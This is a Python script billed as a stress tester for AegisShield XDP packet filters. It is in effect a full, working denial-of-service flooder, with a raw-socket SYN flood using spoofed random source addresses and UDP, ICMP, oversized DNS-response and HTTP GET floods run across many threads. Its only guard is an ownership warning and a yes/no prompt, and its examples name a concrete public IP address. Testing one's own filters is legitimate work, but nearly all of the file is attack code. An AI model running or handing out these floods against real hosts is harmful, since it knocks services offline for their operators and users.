#!/usr/bin/env python3
"""
AegisShield Stress Tester
─────────────────────────
A legitimate stress testing tool to verify your AegisShield XDP filters
are correctly dropping attack traffic on YOUR OWN servers.

⚠️  ONLY use this against servers YOU OWN for security testing purposes.

Usage:
    sudo python3 stress_test.py <TARGET_IP> <METHOD> [--port PORT] [--threads THREADS] [--duration SECONDS]

Methods:
    syn       - TCP SYN flood (tests syn_flood_drops)
    udp       - UDP packet flood (tests udp_rate_drops)
    icmp      - ICMP echo flood (tests icmp_rate_drops)
    dns       - DNS amplification sim (tests dns_amp_drops)
    http      - HTTP GET flood (tests passed_total under load)
    mixed     - All methods combined (full stress test)

Example:
    sudo python3 stress_test.py 45.55.80.133 syn --threads 5 --duration 30
    sudo python3 stress_test.py 45.55.80.133 mixed --duration 60
"""

import argparse
import os
import random
import signal
import socket
import struct
import sys
import threading
import time
from datetime import datetime

# ───────────────────────────── ANSI Colors ─────────────────────────────
CYAN    = "\033[1;36m"
RED     = "\033[1;31m"
GREEN   = "\033[1;32m"
YELLOW  = "\033[1;33m"
MAGENTA = "\033[1;35m"
WHITE   = "\033[1;37m"
RESET   = "\033[0m"
DIM     = "\033[2m"

# ───────────────────────────── Globals ─────────────────────────────────
stop_event = threading.Event()
counters = {
    "syn_sent": 0,
    "udp_sent": 0,
    "icmp_sent": 0,
    "dns_sent": 0,
    "http_sent": 0,
}
counter_lock = threading.Lock()


def signal_handler(sig, frame):
    stop_event.set()


signal.signal(signal.SIGINT, signal_handler)


# ───────────────────────────── Banner ──────────────────────────────────
def print_banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""
{CYAN}╔═══════════════════════════════════════════════════════════╗
║          AegisShield Stress Tester v1.0                   ║
║          XDP Filter Verification Tool                     ║
╠═══════════════════════════════════════════════════════════╣
║  {YELLOW}⚠  ONLY use against YOUR OWN servers for testing{CYAN}         ║
╚═══════════════════════════════════════════════════════════╝{RESET}
""")


# ───────────────────────────── IP Checksum ─────────────────────────────
def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


# ───────────────────────────── SYN Flood ───────────────────────────────
def syn_flood(target_ip, target_port):
    """Send TCP SYN packets with random source IPs to test syn_flood_drops."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"{RED}[!] Raw sockets require root. Run with sudo.{RESET}")
        stop_event.set()
        return

    while not stop_event.is_set():
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)

            # IP Header
            ip_header = struct.pack(
                "!BBHHHBBH4s4s",
                0x45, 0, 40,  # version, tos, total length
                random.randint(1, 65535), 0,  # id, frag
                64, socket.IPPROTO_TCP,  # ttl, protocol
                0,  # checksum (kernel fills)
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip),
            )

            # TCP Header with SYN flag
            seq = random.randint(0, 0xFFFFFFFF)
            tcp_header = struct.pack(
                "!HHIIBBHHH",
                src_port, target_port,
                seq, 0,  # seq, ack
                0x50, 0x02,  # data offset (5 words), SYN flag
                65535, 0, 0,  # window, checksum, urgent
            )

            # TCP Pseudo header for checksum
            pseudo = struct.pack(
                "!4s4sBBH",
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip),
                0, socket.IPPROTO_TCP, len(tcp_header),
            )
            tcp_check = checksum(pseudo + tcp_header)
            tcp_header = struct.pack(
                "!HHIIBBHHH",
                src_port, target_port,
                seq, 0,
                0x50, 0x02,
                65535, tcp_check, 0,
            )

            sock.sendto(ip_header + tcp_header, (target_ip, 0))
            with counter_lock:
                counters["syn_sent"] += 1

        except Exception:
            pass

    sock.close()


# ───────────────────────────── UDP Flood ───────────────────────────────
def udp_flood(target_ip, target_port):
    """Send massive UDP packets to test udp_rate_drops."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception:
        return

    payload = random.randbytes(1024)

    while not stop_event.is_set():
        try:
            port = target_port if target_port else random.randint(1, 65535)
            sock.sendto(payload, (target_ip, port))
            with counter_lock:
                counters["udp_sent"] += 1
        except Exception:
            pass

    sock.close()


# ───────────────────────────── ICMP Flood ──────────────────────────────
def icmp_flood(target_ip, _port):
    """Send ICMP echo requests to test icmp_rate_drops."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print(f"{RED}[!] ICMP requires root. Run with sudo.{RESET}")
        stop_event.set()
        return

    while not stop_event.is_set():
        try:
            # ICMP Echo Request: type=8, code=0
            icmp_id = random.randint(0, 65535)
            icmp_seq = random.randint(0, 65535)
            header = struct.pack("!BBHHH", 8, 0, 0, icmp_id, icmp_seq)
            payload = random.randbytes(56)
            chk = checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, chk, icmp_id, icmp_seq)
            sock.sendto(header + payload, (target_ip, 0))
            with counter_lock:
                counters["icmp_sent"] += 1
        except Exception:
            pass

    sock.close()


# ───────────────────────────── DNS Amp Sim ─────────────────────────────
def dns_flood(target_ip, _port):
    """Send large DNS-like UDP responses to port 53 to test dns_amp_drops."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception:
        return

    # Craft an oversized DNS-like response (>512 bytes to trigger filter)
    dns_header = struct.pack("!HHHHHH", 0x1234, 0x8180, 1, 10, 0, 0)
    padding = random.randbytes(600)  # >512 bytes triggers dns_amp filter
    payload = dns_header + padding

    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, 53))
            with counter_lock:
                counters["dns_sent"] += 1
        except Exception:
            pass

    sock.close()


# ───────────────────────────── HTTP Flood ──────────────────────────────
def http_flood(target_ip, target_port):
    """Send HTTP GET requests to test application layer handling."""
    port = target_port if target_port else 80

    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: AegisTest/1.0\r\nConnection: close\r\n\r\n"
            sock.send(request.encode())
            with counter_lock:
                counters["http_sent"] += 1
            sock.close()
        except Exception:
            pass

    try:
        sock.close()
    except Exception:
        pass


# ───────────────────────────── Live Monitor ────────────────────────────
def live_monitor(target_ip, method, duration, threads):
    """Print a live dashboard of packets sent."""
    start_time = time.time()

    while not stop_event.is_set():
        elapsed = time.time() - start_time
        remaining = max(0, duration - elapsed)

        if elapsed >= duration:
            stop_event.set()
            break

        with counter_lock:
            snap = dict(counters)

        total = sum(snap.values())
        pps = int(total / max(elapsed, 1))

        # Move cursor up and overwrite
        lines = 14
        sys.stdout.write(f"\033[{lines}A\r")

        print(f"{CYAN}╔═══════════════════════════════════════════════════════════╗{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}Target:{RESET} {YELLOW}{target_ip}{RESET}    {WHITE}Method:{RESET} {RED}{method.upper()}{RESET}    {WHITE}Threads:{RESET} {MAGENTA}{threads}{RESET}       {CYAN}║{RESET}")
        print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}Elapsed:{RESET}   {GREEN}{elapsed:>8.1f}s{RESET}     {WHITE}Remaining:{RESET} {YELLOW}{remaining:>8.1f}s{RESET}            {CYAN}║{RESET}")
        print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}SYN  Packets:{RESET}  {RED}{snap['syn_sent']:>15,}{RESET}                          {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}UDP  Packets:{RESET}  {RED}{snap['udp_sent']:>15,}{RESET}                          {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}ICMP Packets:{RESET}  {RED}{snap['icmp_sent']:>15,}{RESET}                          {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}DNS  Packets:{RESET}  {RED}{snap['dns_sent']:>15,}{RESET}                          {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}HTTP Requests:{RESET} {RED}{snap['http_sent']:>15,}{RESET}                          {CYAN}║{RESET}")
        print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║{RESET}  {WHITE}Total:{RESET} {GREEN}{total:>12,}{RESET}   {WHITE}Rate:{RESET} {YELLOW}{pps:>10,} pps{RESET}                  {CYAN}║{RESET}")
        print(f"{CYAN}╚═══════════════════════════════════════════════════════════╝{RESET}")

        sys.stdout.flush()
        time.sleep(0.5)


# ───────────────────────────── Main ────────────────────────────────────
METHOD_MAP = {
    "syn":   syn_flood,
    "udp":   udp_flood,
    "icmp":  icmp_flood,
    "dns":   dns_flood,
    "http":  http_flood,
}


def main():
    parser = argparse.ArgumentParser(
        description="AegisShield Stress Tester — Verify your XDP filters",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: sudo python3 stress_test.py 45.55.80.133 syn --threads 5 --duration 30",
    )
    parser.add_argument("target", help="Target IP address (YOUR OWN server)")
    parser.add_argument("method", choices=["syn", "udp", "icmp", "dns", "http", "mixed"],
                        help="Attack method to simulate")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")

    args = parser.parse_args()

    print_banner()

    print(f"  {WHITE}Target:{RESET}   {YELLOW}{args.target}{RESET}")
    print(f"  {WHITE}Method:{RESET}   {RED}{args.method.upper()}{RESET}")
    print(f"  {WHITE}Port:{RESET}     {MAGENTA}{args.port}{RESET}")
    print(f"  {WHITE}Threads:{RESET}  {MAGENTA}{args.threads}{RESET}")
    print(f"  {WHITE}Duration:{RESET} {MAGENTA}{args.duration}s{RESET}")
    print()

    # Confirmation
    confirm = input(f"  {YELLOW}⚠  Confirm stress test against {args.target}? (yes/no): {RESET}")
    if confirm.lower() not in ("yes", "y"):
        print(f"  {GREEN}Cancelled.{RESET}")
        return

    print(f"\n  {GREEN}▶ Starting stress test...{RESET}\n")

    # Placeholder lines for the live monitor to overwrite
    for _ in range(14):
        print()

    # Determine which methods to run
    if args.method == "mixed":
        methods = ["syn", "udp", "icmp", "dns", "http"]
    else:
        methods = [args.method]

    # Launch worker threads
    threads = []
    per_method = max(1, args.threads // len(methods))

    for method_name in methods:
        func = METHOD_MAP[method_name]
        for _ in range(per_method):
            t = threading.Thread(target=func, args=(args.target, args.port), daemon=True)
            t.start()
            threads.append(t)

    # Launch monitor
    monitor = threading.Thread(
        target=live_monitor,
        args=(args.target, args.method, args.duration, len(threads)),
        daemon=True,
    )
    monitor.start()

    # Wait for duration or Ctrl-C
    try:
        end_time = time.time() + args.duration
        while time.time() < end_time and not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass

    stop_event.set()

    # Wait for threads to finish
    for t in threads:
        t.join(timeout=2)

    time.sleep(1)

    # Final summary
    with counter_lock:
        snap = dict(counters)
    total = sum(snap.values())

    print(f"\n\n{CYAN}╔═══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║              STRESS TEST COMPLETE                         ║{RESET}")
    print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET}  Total Packets Sent: {GREEN}{total:>15,}{RESET}                      {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  SYN:  {snap['syn_sent']:>12,}  | UDP:  {snap['udp_sent']:>12,}              {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  ICMP: {snap['icmp_sent']:>12,}  | DNS:  {snap['dns_sent']:>12,}              {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  HTTP: {snap['http_sent']:>12,}                                    {CYAN}║{RESET}")
    print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}Now check your VPS AegisShield dashboard!{RESET}                {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {DIM}The drop counters should match these send counts.{RESET}       {CYAN}║{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════╝{RESET}")


if __name__ == "__main__":
    main()
